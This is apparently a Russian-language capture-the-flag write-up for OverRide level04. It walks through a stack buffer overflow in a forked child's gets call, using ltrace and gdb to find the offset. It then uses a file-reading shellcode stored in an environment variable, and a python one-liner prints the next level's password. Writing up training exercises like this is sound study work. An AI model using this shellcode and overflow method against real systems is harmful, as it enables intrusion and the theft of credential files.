катнув левел, мы видим мем:
[�%uGive me some shellcode, kchild is exiting...no exec() for you;P    L�� (так же походу не даст нам прокинуть exec bin/sh from shellocode)

Походу тут опять какой-нибудь gets для которого нужен shellcode
ltrace собственно подтверждает 
level04@OverRide:~$ ltrace ./level04
__libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
signal(14, 0x0804868f)                                                   = NULL
alarm(60)                                                                = 0
fork(Give me some shellcode, k
)                                                                   = 2120
wait(0xf

info functions:
0x080484a0  fflush
0x080484a0  fflush@plt
0x080484b0  gets             как я и говорил
0x080484b0  gets@plt
0x080484c0  getchar
0x080484c0  getchar@plt
0x080484d0  signal
0x080484d0  signal@plt
0x080484e0  alarm
0x080484e0  alarm@plt
0x080484f0  wait
0x080484f0  wait@plt
0x08048500  puts
0x08048500  puts@plt

Но есть какой-то страшный fork

   0x080486d6 <+14>:    call   0x8048550 <fork@plt> -- форкаемся
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp) смотрим что мы - чайлд (obj = fork; if obj == 0 then we are child)
   0x08048711 <+73>:    jne    0x8048769 <main+161> и если мы чайлд то
   0x0804875e <+150>:    call   0x80484b0 <gets@plt> по итогу проваливаемся в гетс который мы должны хАкнуть

Т.е мы за раз(родителем) должны провалится в gets и вставить туда shellcode. так же мы должны найти offset. Ищем через https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
ю.д

ltrace -f позволяет нам отслеживать дочерний процесс

оффсет в 100 нам ничего не дал, пробуем в 200

level04@OverRide:~$ ltrace -f ./level04
[pid 2257] __libc_start_main(0x80486c8, 1, -10348, 0x8048830, 0x80488a0 <unfinished ...>
[pid 2257] signal(14, 0x0804868f)                                        = NULL
[pid 2257] alarm(60)                                                     = 0
[pid 2257] fork()                                                        = 2258
[pid 2257] wait(0xffffd65c <unfinished ...>
[pid 2258] <... fork resumed> )                                          = 0
[pid 2258] prctl(1, 1, 0, 0xf7e2fe44, 2944)                              = 0
[pid 2258] ptrace(0, 0, 0, 0, 2944)                                      = -1
[pid 2258] puts("Give me some shellcode, k"Give me some shellcode, k
)                             = 26
[pid 2258] gets(-10656, 0, 0, 0, 2944Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
)                                   = -10656
[pid 2258] --- SIGSEGV (Segmentation fault) ---
[pid 2258] +++ killed by SIGSEGV +++
[pid 2257] --- SIGCHLD (Child exited) ---
[pid 2257] <... wait resumed> )                                          = 2258
[pid 2257] puts("child is exiting..."child is exiting...
)                                   = 20
[pid 2257] +++ exited (status 0) +++
level04@OverRide:~$

EIP не дал :( . Тогда идем в gdb
set follow-fork-mode child - позесимся в child.

(gdb) r
Starting program: /home/users/level04/level04
[New process 2265]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2265]
0x41326641 in ?? () - EIP :)

Вставив его в генератор получим оффсет: 
156

далее находим shellcode to open bin/sh. Но есть проблема, используется ptrace родителем, который запрещает execute дочернему процессу.
Поэтому нам нужно не вызывать execute, а читать: http://shell-storm.org/shellcode/files/shellcode-73.php
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/etc/passwd"; //Put here the file path, default is /etc/passwd

export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'

megahuxks.c:
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("SHELLCODE"));
}

если скомпилим по дефолту, то будет компилить в x64, но адрес его нам не подходит, по этому компилим 32 
level04@OverRide:/tmp$ gcc -m32 megahuxks.c
level04@OverRide:/tmp$ ./a.out
0xffffd881


По итогу эксплойт:

offset + shellcodeaddr


level04@OverRide:~$ python -c "print 156 * 'a' + '\x81\xd8\xff\xff'" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
